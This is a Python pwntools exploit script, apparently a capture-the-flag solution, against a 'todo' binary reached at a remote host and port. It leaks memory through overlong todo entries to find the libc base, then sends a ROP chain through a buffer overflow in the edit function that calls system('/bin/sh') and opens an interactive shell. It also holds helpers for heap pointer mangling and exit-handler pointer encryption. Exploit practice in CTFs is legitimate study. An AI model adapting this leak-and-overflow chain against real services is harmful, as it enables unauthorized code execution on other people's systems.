from pwn import *

con = "10.212.173.64 32209"

host, port = con.replace(" ", ":").split(":")

ssl = False

binary = './todo_patched'

gdbscript = '''
    b *editTodoItem
    c
'''

elf  = context.binary = ELF(binary)
libc = context.binary.libc
context.terminal = ['tmux', 'splitw', '-h']



# utils
u64 = lambda d: struct.unpack("<Q", d.ljust(8, b"\0"))[0]
u32 = lambda d: struct.unpack("<I", d.ljust(4, b"\0"))[0]
u16 = lambda d: struct.unpack("<H", d.ljust(2, b"\0"))[0]

# credits to spwn by @chino
ru         = lambda *x, **y: p.recvuntil(*x, **y, drop=True)
rl         = lambda *x, **y: p.recvline(*x, **y, keepends=False)
rc         = lambda *x, **y: p.recv(*x, **y)
sla        = lambda *x, **y: p.sendlineafter(*x, **y)
sa         = lambda *x, **y: p.sendafter(*x, **y)
sl         = lambda *x, **y: p.sendline(*x, **y)
sn         = lambda *x, **y: p.send(*x, **y)
logbase    = lambda: log.info("libc base = %#x" % libc.address)
logleak    = lambda name, val: log.info(name+" = %#x" % val)
ls         = lambda x: log.success(x)
lss        = lambda x: ls('\033[1;31;40m%s -> 0x%x \033[0m' % (x, eval(x)))
one_gadget = lambda: [int(i) + libc.address for i in subprocess.check_output(['one_gadget', '--raw', '-l1', libc.path]).decode().split(' ')]

# exit_handler stuff
fs_decrypt = lambda addr, key: ror(addr, 0x11) ^ key
fs_encrypt = lambda addr, key: rol(addr ^ key, 0x11)


# heap stuff
prot_ptr = lambda pos, ptr: (pos >> 12) ^ ptr
def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val


def start(argv=[], *a, **kw):
    if args.GDB: return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: return remote(host, port, ssl=ssl)
    else: return process([elf.path] + argv, *a, **kw)


def addTodo(todo):
    sla(b"choice: ", b"0")
    sa(b": ", todo)

def printTodoItem(index):
    sla(b"choice: ", b"1")
    sla(b": ", str(index).encode())
    ru(b": ")
    return rl()

def editTodoItem(todo, index):
    sla(b"choice: ", b"3")
    sla(b": ", str(index).encode())
    sla(b": ", todo)

p = start()
for i in range(32):
    addTodo(b"A"*128 + b"\xff")
todo = printTodoItem(31)
leak = [u64(todo[i:i+8]) for i in range(0, len(todo), 8)]
libc.address = leak[20] - (libc.sym.__libc_start_call_main+122)
logbase()

rop = ROP(libc)
rop.raw("A"*128) # fill buffer
rop.raw("B"*8) # length
# we are overflowing index as well, so we must make sure it is a "valid" index so that the copy can happen without issues
rop.raw(20)
rop.raw("A"*24) # extra padding
# ret to align stack so it's multiple of 16 (16 byte alignment)
rop.raw(rop.ret.address)
rop.system(next(libc.search(b"/bin/sh\x00")))

editTodoItem(rop.chain(), 0)

p.interactive()
